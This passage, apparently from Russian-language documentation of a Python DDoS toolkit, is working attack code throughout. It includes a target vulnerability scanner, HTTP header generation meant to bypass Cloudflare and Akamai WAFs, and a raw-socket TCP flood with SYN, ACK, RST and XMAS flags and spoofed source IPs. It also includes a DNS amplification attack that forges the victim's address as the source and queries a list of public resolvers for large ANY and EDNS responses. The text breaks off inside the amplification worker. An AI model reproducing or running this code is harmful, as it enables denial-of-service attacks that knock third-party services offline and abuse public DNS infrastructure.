    hostname = self.results['parsed_url']['hostname']
    port = self.results['parsed_url']['port'] or 443
    
    ssl_info = {
        'supported': False,
        'certificate': {},
        'protocols': [],
        'ciphers': [],
        'vulnerabilities': []
    }
    
    try:
        # Проверка поддержки TLS версий
        tls_versions = [
            ('TLSv1.3', ssl.PROTOCOL_TLS),
            ('TLSv1.2', ssl.PROTOCOL_TLSv1_2),
            ('TLSv1.1', ssl.PROTOCOL_TLSv1_1),
            ('TLSv1.0', ssl.PROTOCOL_TLSv1),
            ('SSLv3', ssl.PROTOCOL_SSLv23)
        ]
        
        for version_name, protocol in tls_versions:
            try:
                context = ssl.SSLContext(protocol)
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(hostname, port, ssl=context),
                    timeout=5.0
                )
                
                ssl_info['supported'] = True
                ssl_info['protocols'].append(version_name)
                
                # Получение информации о сертификате
                ssl_object = writer.get_extra_info('ssl_object')
                cert = ssl_object.getpeercert()
                
                if cert and not ssl_info['certificate']:
                    ssl_info['certificate'] = self._parse_certificate(cert)
                
                writer.close()
                await writer.wait_closed()
                
            except:
                continue
        
        # Проверка уязвимостей
        await self._check_ssl_vulnerabilities(ssl_info)
        
    except Exception as e:
        ssl_info['error'] = str(e)
    
    self.results['ssl_info'] = ssl_info
```

### 6.6. Поиск уязвимостей

```python
async def check_vulnerabilities(self):
    """Проверка общих уязвимостей"""
    vulnerabilities = []
    hostname = self.results['parsed_url']['hostname']
    
    # Список проверок
    checks = [
        ('HTTP-TRACE', self._check_http_trace),
        ('PHPINFO', self._check_phpinfo),
        ('DIRECTORY_LISTING', self._check_directory_listing),
        ('DEBUG_ENDPOINTS', self._check_debug_endpoints),
        ('CONFIG_FILES', self._check_config_files),
        ('BACKUP_FILES', self._check_backup_files)
    ]
    
    # Параллельное выполнение проверок
    tasks = []
    for vuln_name, check_func in checks:
        task = asyncio.create_task(check_func(hostname))
        tasks.append((vuln_name, task))
    
    for vuln_name, task in tasks:
        try:
            result = await task
            if result:
                vulnerabilities.append({
                    'type': vuln_name,
                    'severity': result['severity'],
                    'description': result['description'],
                    'details': result.get('details')
                })
        except Exception as e:
            if 'debug' in globals():
                print(f"{Fore.YELLOW}⚠️  Ошибка проверки {vuln_name}: {e}{Style.RESET_ALL}")
    
    self.results['vulnerabilities'] = vulnerabilities
```

---

## 7. МОДУЛЬ: `utils.py`

### 7.1. Генерация HTTP-заголовков v10.0

```python
class HeaderFactory:
    """Фабрика HTTP-заголовков с поддержкой обхода WAF"""
    
    # База данных User-Agent по категориям
    USER_AGENT_CATEGORIES = {
        'desktop': [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        ],
        'mobile': [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
        ],
        'bot': [
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
        ],
        'ctf': [
            'CTF-Scanner/10.0',
            'DiamondEye-Security-Scanner/1.0',
            'Pentest-Tool/v10.0'
        ]
    }
    
    # Заголовки для обхода WAF
    WAF_BYPASS_HEADERS = {
        'cloudflare': {
            'CF-Connecting-IP': '8.8.8.8',
            'X-Forwarded-For': '8.8.8.8',
            'True-Client-IP': '8.8.8.8',
            'CF-RAY': 'random_hash',
            'CF-IPCountry': 'US'
        },
        'akamai': {
            'X-Akamai-Edgescape': 'city=New York, country_code=US',
            'X-Akamai-Request-ID': 'random_id',
            'X-True-Client-IP': '8.8.8.8'
        },
        'generic': {
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': 'random_token',
            'X-Ajax-Navigation': 'true'
        }
    }
    
    @classmethod
    def create_headers(cls, config, bypass_type=None):
        """Создание набора заголовков с поддержкой обхода WAF"""
        headers = cls._base_headers(config)
        
        # Выбор User-Agent
        if config.get('rotate_ua'):
            headers['User-Agent'] = cls._rotate_user_agent(config.get('ua_category', 'desktop'))
        elif config.get('useragents'):
            headers['User-Agent'] = random.choice(config['useragents'])
        
        # Обход WAF
        if bypass_type and bypass_type in cls.WAF_BYPASS_HEADERS:
            headers.update(cls.WAF_BYPASS_HEADERS[bypass_type])
        
        # Случайные заголовки
        if config.get('junk'):
            headers.update(cls._generate_junk_headers(
                count=20 if config.get('header_flood') else random.randint(3, 8)
            ))
        
        # Спуфинг Host
        if config.get('random_host'):
            original_host = headers.get('Host', '')
            headers['Host'] = f"{random_string(8)}.{original_host}"
        
        return headers
    
    @classmethod
    def _generate_junk_headers(cls, count):
        """Генерация мусорных заголовков"""
        junk = {}
        for _ in range(count):
            # Случайный префикс
            prefixes = ['X-', 'HTTP-', 'CF-', 'X-Forwarded-', 'X-Real-']
            prefix = random.choice(prefixes)
            
            # Генерация ключа
            if prefix.endswith('-'):
                key = prefix + random_string(random.randint(3, 12)).capitalize()
            else:
                key = random_string(random.randint(5, 15)).capitalize()
            
            # Генерация значения
            value_types = [
                lambda: random_string(random.randint(5, 50)),
                lambda: str(random.randint(1, 1000000)),
                lambda: random_ip(),
                lambda: datetime.now().isoformat()
            ]
            
            value = random.choice(value_types)()
            junk[key] = value
        
        return junk
```

### 7.2. Обработка данных v10.0

```python
class DataProcessor:
    """Обработка и преобразование данных для атак"""
    
    @staticmethod
    def parse_size_string(size_str):
        """
        Парсинг строковых представлений размера
        Поддерживает: 1k, 64kb, 1.5m, 2mb, 1024, 1g, 500gb
        """
        size_str = str(size_str).strip().lower()
        
        # Удаление пробелов и 'b' в конце
        size_str = size_str.replace(' ', '').rstrip('b')
        
        # Регулярное выражение для парсинга
        pattern = r'^(\d+(?:\.\d+)?)\s*([kmgtp])?$'
        match = re.match(pattern, size_str)
        
        if not match:
            raise ValueError(f"Invalid size format: {size_str}")
        
        value, unit = match.groups()
        value = float(value)
        
        multipliers = {
            'k': 1024,
            'm': 1024**2,
            'g': 1024**3,
            't': 1024**4,
            'p': 1024**5
        }
        
        if unit and unit in multipliers:
            return int(value * multipliers[unit])
        
        return int(value)
    
    @staticmethod
    def generate_payload(size, payload_type='random', **kwargs):
        """Генерация полезной нагрузки различных типов"""
        generators = {
            'random': lambda s: random_string(s),
            'json': lambda s: DataProcessor._generate_json_payload(s, kwargs.get('depth', 3)),
            'xml': lambda s: DataProcessor._generate_xml_payload(s, kwargs.get('depth', 3)),
            'form': lambda s: DataProcessor._generate_form_payload(s),
            'graphql': lambda s: DataProcessor._generate_graphql_payload(s),
            'sql': lambda s: DataProcessor._generate_sql_payload(s)
        }
        
        generator = generators.get(payload_type, generators['random'])
        return generator(size)
    
    @staticmethod
    def _generate_json_payload(size, depth=3):
        """Генерация вложенного JSON"""
        def generate_object(current_depth):
            if current_depth >= depth:
                return random_string(10)
            
            obj = {}
            for _ in range(random.randint(1, 5)):
                key = random_string(random.randint(3, 10))
                if random.random() > 0.5:
                    obj[key] = generate_object(current_depth + 1)
                else:
                    obj[key] = random_string(random.randint(5, 20))
            
            return obj
        
        payload = generate_object(0)
        json_str = json.dumps(payload, indent=2)
        
        # Обрезаем или дополняем до нужного размера
        if len(json_str) > size:
            return json_str[:size]
        else:
            return json_str + ' ' * (size - len(json_str))
```

### 7.3. Сетевая утилиты

```python
class NetworkUtils:
    """Утилиты для работы с сетью"""
    
    @staticmethod
    def is_localhost(url):
        """Проверка, является ли цель localhost"""
        parsed = urlparse(url)
        hostname = parsed.hostname or ''
        
        localhost_patterns = [
            'localhost',
            '127.0.0.1',
            '0.0.0.0',
            '::1',
            '0:0:0:0:0:0:0:1'
        ]
        
        return any(pattern in hostname for pattern in localhost_patterns)
    
    @staticmethod
    async def check_port_open(host, port, timeout=2.0):
        """Асинхронная проверка открытого порта"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False
    
    @staticmethod
    def get_local_ip():
        """Получение локального IP адреса"""
        try:
            # Создаем временное соединение чтобы определить IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def generate_ip_range(start_ip, end_ip):
        """Генерация диапазона IP адресов"""
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        
        ips = []
        while start <= end:
            ips.append('.'.join(map(str, start)))
            
            # Увеличиваем IP
            start[3] += 1
            for i in (3, 2, 1, 0):
                if start[i] == 256:
                    start[i] = 0
                    if i > 0:
                        start[i-1] += 1
        
        return ips
```

---

## 8. МОДУЛЬ: `resource_monitor.py`

### 8.1. Архитектура мониторинга ресурсов

```python
class ResourceMonitor:
    """Продвинутый мониторинг системных ресурсов в реальном времени"""
    
    def __init__(self, alert_threshold=90, history_size=1000):
        self.start_time = time.time()
        self.alert_threshold = alert_threshold
        self.history_size = history_size
        
        # История метрик
        self.metrics_history = {
            'cpu': deque(maxlen=history_size),
            'ram': deque(maxlen=history_size),
            'network_sent': deque(maxlen=history_size),
            'network_recv': deque(maxlen=history_size),
            'connections': deque(maxlen=history_size),
            'disk_io': deque(maxlen=history_size)
        }
        
        # Базовые значения для вычисления дельт
        self.net_io_start = psutil.net_io_counters()
        self.disk_io_start = psutil.disk_io_counters()
        
        # Статистика
        self.samples = 0
        self.alerts = []
        self._monitoring = False
        
    async def monitor(self, interval=1.0):
        """Непрерывный мониторинг ресурсов"""
        self._monitoring = True
        
        print(f"{Fore.CYAN}📊 Запуск мониторинга ресурсов (интервал: {interval}s){Style.RESET_ALL}")
        
        last_net = self.net_io_start
        last_disk = self.disk_io_start
        
        try:
            while self._monitoring:
                snapshot = await self._take_snapshot(last_net, last_disk)
                self._store_metrics(snapshot)
                
                # Проверка на превышение порогов
                alerts = self._check_thresholds(snapshot)
                if alerts:
                    self._handle_alerts(alerts)
                
                # Периодический вывод статистики
                if self.samples % 10 == 0:
                    self._print_summary()
                
                # Обновление последних значений
                last_net = snapshot['network']['current']
                if snapshot['disk']['current']:
                    last_disk = snapshot['disk']['current']
                
                await asyncio.sleep(interval)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"{Fore.RED}❌ Ошибка мониторинга: {e}{Style.RESET_ALL}")
```

### 8.2. Сбор метрик

```python
async def _take_snapshot(self, last_net, last_disk):
    """Создание снимка текущего состояния системы"""
    snapshot = {
        'timestamp': time.time(),
        'cpu': {},
        'memory': {},
        'network': {},
        'disk': {},
        'connections': {}
    }
    
    # CPU метрики
    cpu_percent = psutil.cpu_percent(interval=None)
    cpu_times = psutil.cpu_times()
    
    snapshot['cpu'] = {
        'percent': cpu_percent,
        'user': cpu_times.user,
        'system': cpu_times.system,
        'idle': cpu_times.idle,
        'load_avg': psutil.getloadavg() if hasattr(psutil, 'getloadavg') else None
    }
    
    # Memory метрики
    memory = psutil.virtual_memory()
    snapshot['memory'] = {
        'percent': memory.percent,
        'used_gb': memory.used / 1024**3,
        'available_gb': memory.available / 1024**3,
        'total_gb': memory.total / 1024**3
    }
    
    # Network метрики
    net_io = psutil.net_io_counters()
    snapshot['network'] = {
        'current': net_io,
        'sent_bytes': net_io.bytes_sent - last_net.bytes_sent,
        'recv_bytes': net_io.bytes_recv - last_net.bytes_recv,
        'sent_packets': net_io.packets_sent - last_net.packets_sent,
        'recv_packets': net_io.packets_recv - last_net.packets_recv,
        'connections': len(psutil.net_connections())
    }
    
    # Disk метрики
    try:
        disk_io = psutil.disk_io_counters()
        snapshot['disk'] = {
            'current': disk_io,
            'read_bytes': disk_io.read_bytes - last_disk.read_bytes,
            'write_bytes': disk_io.write_bytes - last_disk.write_bytes,
            'read_count': disk_io.read_count - last_disk.read_count,
            'write_count': disk_io.write_count - last_disk.write_count
        }
    except:
        snapshot['disk'] = {'current': None}
    
    return snapshot
```

### 8.3. Анализ и предупреждения

```python
def _check_thresholds(self, snapshot):
    """Проверка на превышение пороговых значений"""
    alerts = []
    
    # CPU проверка
    if snapshot['cpu']['percent'] > self.alert_threshold:
        alerts.append({
            'type': 'cpu',
            'value': snapshot['cpu']['percent'],
            'threshold': self.alert_threshold,
            'message': f"Высокая загрузка CPU: {snapshot['cpu']['percent']}%"
        })
    
    # Memory проверка
    if snapshot['memory']['percent'] > self.alert_threshold:
        alerts.append({
            'type': 'memory',
            'value': snapshot['memory']['percent'],
            'threshold': self.alert_threshold,
            'message': f"Высокая загрузка RAM: {snapshot['memory']['percent']}%"
        })
    
    # Network проверка
    sent_mbps = (snapshot['network']['sent_bytes'] * 8) / 1024 / 1024
    if sent_mbps > 1000:  # 1 Gbps
        alerts.append({
            'type': 'network',
            'value': sent_mbps,
            'threshold': 1000,
            'message': f"Высокая сетевая нагрузка: {sent_mbps:.2f} Mbps"
        })
    
    # Connections проверка
    if snapshot['network']['connections'] > 10000:
        alerts.append({
            'type': 'connections',
            'value': snapshot['network']['connections'],
            'threshold': 10000,
            'message': f"Большое количество соединений: {snapshot['network']['connections']}"
        })
    
    return alerts

def _handle_alerts(self, alerts):
    """Обработка предупреждений"""
    for alert in alerts:
        self.alerts.append({
            'timestamp': time.time(),
            'alert': alert
        })
        
        # Вывод предупреждения
        print(f"{Fore.RED}⚠️  {alert['message']}{Style.RESET_ALL}")
        
        # Рекомендации
        recommendations = self._get_recommendations(alert['type'])
        if recommendations:
            print(f"{Fore.YELLOW}   Рекомендации: {recommendations}{Style.RESET_ALL}")
```

### 8.4. Генерация отчетов

```python
def get_report(self):
    """Получение детального отчета о ресурсах"""
    if not self.metrics_history['cpu']:
        return {}
    
    duration = time.time() - self.start_time
    
    # Расчет статистики
    report = {
        'duration': duration,
        'samples': self.samples,
        'alerts': len(self.alerts),
        'timestamp': datetime.now().isoformat()
    }
    
    # CPU статистика
    cpu_values = list(self.metrics_history['cpu'])
    if cpu_values:
        report['cpu'] = {
            'average': statistics.mean(cpu_values),
            'maximum': max(cpu_values),
            'minimum': min(cpu_values),
            'percentile_95': statistics.quantiles(cpu_values, n=20)[18],
            'samples': len(cpu_values)
        }
    
    # Memory статистика
    ram_values = list(self.metrics_history['ram'])
    if ram_values:
        report['memory'] = {
            'average': statistics.mean(ram_values),
            'maximum': max(ram_values),
            'minimum': min(ram_values),
            'samples': len(ram_values)
        }
    
    # Network статистика
    sent_values = list(self.metrics_history['network_sent'])
    if sent_values and duration > 0:
        total_sent = sum(sent_values)
        report['network'] = {
            'total_sent_bytes': total_sent,
            'total_sent_mb': total_sent / 1024 / 1024,
            'average_sent_mbps': (total_sent * 8) / duration / 1024 / 1024,
            'peak_sent_mbps': max(sent_values) * 8 / 1024 / 1024,
            'average_connections': statistics.mean(list(self.metrics_history['connections']))
        }
    
    # Рекомендации по оптимизации
    report['recommendations'] = self._generate_recommendations()
    
    return report

def _generate_recommendations(self):
    """Генерация рекомендаций по оптимизации"""
    recommendations = []
    
    # Анализ CPU
    cpu_avg = statistics.mean(list(self.metrics_history['cpu']))
    if cpu_avg > 80:
        recommendations.append("Уменьшите количество workers для снижения нагрузки на CPU")
    elif cpu_avg < 30:
        recommendations.append("Можно увеличить количество workers для более эффективного использования CPU")
    
    # Анализ сети
    sent_values = list(self.metrics_history['network_sent'])
    if sent_values:
        avg_sent_mbps = statistics.mean(sent_values) * 8 / 1024 / 1024
        if avg_sent_mbps > 500:
            recommendations.append("Рассмотрите использование HTTP/2 для уменьшения количества соединений")
        elif avg_sent_mbps < 50:
            recommendations.append("Можно увеличить количество sockets на worker")
    
    # Анализ памяти
    ram_avg = statistics.mean(list(self.metrics_history['ram']))
    if ram_avg > 80:
        recommendations.append("Уменьшите размер data-size или количество соединений")
    
    return recommendations
```

---

## 9. LAYER4: `tcp_flood.py`

### 9.1. Архитектура TCP Flood

```python
class TCPFlood:
    """TCP Flood атака с поддержкой raw sockets и спуфинга IP"""
    
    def __init__(self, target_ip: str, target_port: int, workers: int = 100,
                 spoof_ip: bool = False, packet_size: int = 1024, duration: int = 0):
        self.target_ip = target_ip
        self.target_port = target_port
        self.workers = workers
        self.spoof_ip = spoof_ip
        self.packet_size = packet_size
        self.duration = duration
        
        self.sent_packets = 0
        self.sent_bytes = 0
        self._running = False
        self._tasks = []
        
        # Для спуфинга IP
        self.source_ips = []
        if spoof_ip:
            self._generate_spoof_ips(1000)  # Генерация пула IP
        
        # Статистика
        self.pps_history = []  # Packets per second
        self.error_count = 0
```

### 9.2. Создание TCP пакетов

```python
def craft_tcp_packet(self, source_ip: str, source_port: int, flags: int = 0x02) -> bytes:
    """Создание TCP пакета с указанными флагами"""
    # IP заголовок (20 байт)
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20  # IP + TCP заголовки
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = random.randint(64, 255)
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(self.target_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        ip_saddr,
        ip_daddr
    )
    
    # TCP заголовок (20 байт)
    tcp_source = source_port
    tcp_dest = self.target_port
    tcp_seq = random.randint(0, 0xFFFFFFFF)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4)
    tcp_flags = flags  # SYN=0x02, ACK=0x10, RST=0x04
    
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_source,
        tcp_dest,
        tcp_seq,
        tcp_ack_seq,
        tcp_offset_res,
        tcp_flags,
        tcp_window,
        tcp_check,
        tcp_urg_ptr
    )
    
    # Псевдо заголовок для вычисления checksum
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(self.target_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    psh = struct.pack('!4s4sBBH',
        source_address,
        dest_address,
        placeholder,
        protocol,
        tcp_length
    )
    psh = psh + tcp_header
    
    # Вычисление checksum
    tcp_check = self._checksum(psh)
    tcp_header = struct.pack('!HHLLBBH',
        tcp_source,
        tcp_dest,
        tcp_seq,
        tcp_ack_seq,
        tcp_offset_res,
        tcp_flags,
        tcp_window
    ) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    
    # Добавление данных если нужно
    if self.packet_size > 40:
        data_size = self.packet_size - 40
        data = os.urandom(data_size)
        return ip_header + tcp_header + data
    
    return ip_header + tcp_header
```

### 9.3. Воркеры для отправки пакетов

```python
async def flood_worker(self, worker_id: int, packet_type: str = 'syn'):
    """Воркер для отправки TCP пакетов"""
    try:
        # Создание raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # Настройка флагов в зависимости от типа атаки
        flags_map = {
            'syn': 0x02,      # SYN flood
            'ack': 0x10,      # ACK flood
            'rst': 0x04,      # RST flood
            'fin': 0x01,      # FIN flood
            'xmas': 0x29,     # XMAS (FIN+URG+PSH)
            'null': 0x00      # NULL packet
        }
        
        flags = flags_map.get(packet_type, 0x02)
        start_time = time.time()
        
        while self._running:
            # Проверка длительности
            if self.duration > 0 and time.time() - start_time > self.duration:
                break
            
            # Выбор source IP
            if self.spoof_ip and self.source_ips:
                source_ip = random.choice(self.source_ips)
            else:
                source_ip = self._get_local_ip()
            
            # Выбор source port
            source_port = random.randint(1024, 65535)
            
            # Создание и отправка пакета
            packet = self.craft_tcp_packet(source_ip, source_port, flags)
            
            try:
                sock.sendto(packet, (self.target_ip, self.target_port))
                
                # Обновление статистики
                self.sent_packets += 1
                self.sent_bytes += len(packet)
                
                # Вывод статистики каждые 1000 пакетов
                if self.sent_packets % 1000 == 0:
                    elapsed = time.time() - start_time
                    pps = int(self.sent_packets / elapsed) if elapsed > 0 else 0
                    print(f"\r{Fore.WHITE}📦 Пакетов: {self.sent_packets:,} | "
                          f"⚡ PPS: {pps:,} | "
                          f"📊 {self.sent_bytes / 1024 / 1024:.1f} MB{Style.RESET_ALL}", end="")
                
            except (BlockingIOError, socket.error) as e:
                self.error_count += 1
                if self.error_count % 100 == 0:
                    print(f"{Fore.YELLOW}⚠️  Ошибок отправки: {self.error_count}{Style.RESET_ALL}")
                await asyncio.sleep(0.001)
                continue
            
            # Небольшая задержка для избежания полной блокировки
            await asyncio.sleep(0.0001)
        
    except PermissionError:
        print(f"{Fore.RED}❌ Требуются права root/admin для raw sockets{Style.RESET_ALL}")
    except Exception as e:
        if self._running:
            print(f"{Fore.RED}[Worker {worker_id}] Ошибка: {e}{Style.RESET_ALL}")
    finally:
        try:
            sock.close()
        except:
            pass
```

### 9.4. Управление атакой

```python
async def start(self, attack_type: str = 'syn'):
    """Запуск TCP флуда"""
    self._running = True
    start_time = time.time()
    
    print(f"{Fore.CYAN}🚀 Запуск TCP {attack_type.upper()} flood...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🎯 Цель: {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}👷 Воркеров: {self.workers}{Style.RESET_ALL}")
    
    if self.spoof_ip:
        print(f"{Fore.YELLOW}🎭 Спуфинг IP: {len(self.source_ips)} адресов{Style.RESET_ALL}")
    
    # Создание задач для воркеров
    self._tasks = []
    for i in range(self.workers):
        task = asyncio.create_task(self.flood_worker(i, attack_type))
        self._tasks.append(task)
    
    # Задача для сбора статистики
    stats_task = asyncio.create_task(self._collect_stats())
    
    # Ожидание завершения
    try:
        if self.duration > 0:
            await asyncio.sleep(self.duration)
            await self.stop()
        else:
            await asyncio.gather(*self._tasks, stats_task)
    except asyncio.CancelledError:
        pass
    
async def stop(self):
    """Остановка атаки"""
    self._running = False
    
    # Отмена всех задач
    for task in self._tasks:
        task.cancel()
    
    # Ожидание завершения
    if self._tasks:
        await asyncio.wait(self._tasks, timeout=2.0)
    
    # Вывод итоговой статистики
    duration = time.time() - self.start_time
    print(f"\n{Fore.GREEN}✅ TCP Flood остановлен{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 Итоговая статистика:{Style.RESET_ALL}")
    print(f"  ⏱️  Длительность: {duration:.1f}s")
    print(f"  📦 Отправлено пакетов: {self.sent_packets:,}")
    print(f"  💾 Отправлено данных: {self.sent_bytes / 1024 / 1024:.2f} MB")
    print(f"  ⚡ Средний PPS: {int(self.sent_packets / duration):,}")
    print(f"  ⚠️  Ошибок: {self.error_count}")
```

---

## 10. AMPLIFICATION: `dns_amp.py`

### 10.1. Архитектура DNS Amplification

```python
class DNSAmplifier:
    """DNS Amplification атака с использованием публичных DNS серверов"""
    
    # Публичные DNS серверы для амплификации
    DNS_SERVERS = [
        '8.8.8.8', '8.8.4.4',           # Google DNS
        '1.1.1.1', '1.0.0.1',           # Cloudflare
        '9.9.9.9', '149.112.112.112',   # Quad9
        '64.6.64.6', '64.6.65.6',       # Verisign
        '208.67.222.222', '208.67.220.220',  # OpenDNS
        '185.228.168.168',              # CleanBrowsing
        '76.76.19.19',                  # Alternate DNS
        '94.140.14.14', '94.140.15.15', # AdGuard
        '84.200.69.80', '84.200.70.40', # DNS.WATCH
    ]
    
    # Домены с большими TXT записями
    LARGE_DOMAINS = [
        'ripe.net',
        'isc.org',
        'arin.net',
        'lacnic.net',
        'afrinic.net',
        'dns.google',
        'anycast.censurfridns.dk',
        'resolver1.opendns.com',
        f'{random.randint(1000000, 9999999)}.example.com'
    ]
    
    def __init__(self, target_ip: str, amplification_factor: int = 50, 
                 workers: int = 100, duration: int = 0):
        self.target_ip = target_ip
        self.amplification_factor = amplification_factor
        self.workers = workers
        self.duration = duration
        
        self.sent_queries = 0
        self.estimated_amplified = 0
        self._running = False
        self._tasks = []
        
        # Кэш DNS серверов
        self.available_servers = self.DNS_SERVERS.copy()
        self._server_weights = {}  # Веса серверов на основе скорости ответа
```

### 10.2. Создание DNS запросов

```python
def craft_dns_query(self, domain: str, query_type: int = 255, query_class: int = 1) -> bytes:
    """
    Создание DNS запроса
    
    Args:
        domain: Домен для запроса
        query_type: Тип запроса (16 = TXT, 255 = ANY, 1 = A, 28 = AAAA)
        query_class: Класс запроса (1 = IN)
    """
    # Transaction ID (случайный)
    transaction_id = random.randint(0, 65535)
    
    # DNS заголовок
    # QR=0 (запрос), OPCODE=0 (стандартный), AA=0, TC=0, RD=1 (рекурсивный)
    flags = 0x0100  # Стандартный запрос с рекурсией
    questions = 1
    answers = 0
    authority = 0
    additional = 0
    
    header = struct.pack('!HHHHHH',
        transaction_id,
        flags,
        questions,
        answers,
        authority,
        additional
    )
    
    # Кодируем домен в QNAME формат
    qname_parts = []
    for part in domain.encode().split(b'.'):
        qname_parts.append(bytes([len(part)]) + part)
    qname_parts.append(b'\x00')
    qname = b''.join(qname_parts)
    
    # QTYPE и QCLASS
    qtype = query_type  # ANY запрос (255) для максимального ответа
    qclass = query_class  # IN класс (1)
    
    question = qname + struct.pack('!HH', qtype, qclass)
    
    return header + question

def craft_edns_query(self, domain: str, payload_size: int = 4096) -> bytes:
    """Создание DNS запроса с EDNS для увеличения размера ответа"""
    # Базовый запрос
    query = self.craft_dns_query(domain, query_type=255)
    
    # Добавление OPT pseudo-RR (EDNS)
    # NAME: . (root)
    # TYPE: OPT (41)
    # UDP payload size
    # Higher bits in extended RCODE and EDNS version
    # DNSSEC OK bit
    # RDLEN
    opt_rr = struct.pack('!HHIHH',
        0,          # NAME: root
        41,         # TYPE: OPT
        payload_size,  # UDP payload size
        0,          # Extended RCODE & EDNS version
        0,          # DNSSEC OK bit
        0           # RDLEN (no variable data)
    )
    
    return query + opt_rr
```

### 10.3. Спуфинг IP пакетов

```python
def craft_spoofed_packet(self, dns_query: bytes, source_port: int) -> bytes:
    """Создание спуфированного IP пакета с DNS запросом"""
    # IP заголовок (20 байт)
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 20 + 8 + len(dns_query)  # IP + UDP + DNS
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_saddr = socket.inet_aton(self.target_ip)  # Спуфинг: исходим от жертвы
    ip_daddr = socket.inet_aton(random.choice(self.available_servers))
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        ip_saddr,
        ip_daddr
    )
    
    # UDP заголовок (8 байт)
    udp_src = source_port
    udp_dst = 53
    udp_len = 8 + len(dns_query)
    udp_check = 0  # 0 для IPv4 (необязательно)
    
    udp_header = struct.pack('!HHHH',
        udp_src,
        udp_dst,
        udp_len,
        udp_check
    )
    
    return ip_header + udp_header + dns_query

def get_spoofed_socket(self):
    """Создание raw socket для спуфинга IP"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # Установка таймаутов
        sock.settimeout(0.1)
        
        return sock, True  # (socket, use_spoofing)
    except PermissionError:
        # Без прав администратора используем обычные сокеты
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.1)
        return sock, False
```

### 10.4. Воркеры amplification атаки

```python
async def amplification_worker(self, worker_id: int):
    """Воркер для отправки DNS запросов"""
    sock, use_spoofing = self.get_spoofed_socket()
    
    if not use_spoofing:
        print(f"{Fore.YELLOW}⚠️  Worker {worker_id}: Без спуфинга IP (требуются root права){Style.RESET_ALL}")
    
    source_port = random.randint(1024, 65535)
    query_types = [255, 16, 1, 28]  # ANY, TXT, A, AAAA
    
    try:
        while self._running:
            try:
                # Выбор случайных параметров
                dns_server = random.choice(self.available_servers)
                domain = random.choice(self.LARGE_DOMAINS)
                query_type = random.choice(query_types)
                
                # Создание DNS запроса
                if random.random() < 0.3:  # 30% запросов с EDNS
                    dns_query = self.craft_edns_query(domain, payload_size=4096)
                else:
                    dns_query = self.craft_dns_query(domain, query_type)
                
                if use_spoofing:
                    # Создание спуфированного пакета
                    packet = self.craft_spoofed_packet(dns_query, source_port)
                    sock.sendto(packet, (dns_server, 53))
                else:
                    # Отправка обычного UDP пакета
                    sock.sendto(dns_query, (dns_server, 53))
                
                # Обновление статистики
                self.sent_queries += 1
                self.estimated_amplified += self.amplification_factor
                
                # Вывод статистики
                if self.sent_queries % 100 == 0:
                    elapsed = time.time() - getattr(self, '_start_time', time.time())
                    qps = int(self.sent_queries / elapsed) if elapsed > 0 else 0
                    estimated_mbps = (self.estimated_amplified * 512) / 1024 / 1024
                    
                    print(f"\r{Fore.WHITE}🌀 Запросов: {self.sent_queries:,} | "
                          f"⚡ QPS: {qps:,} | "
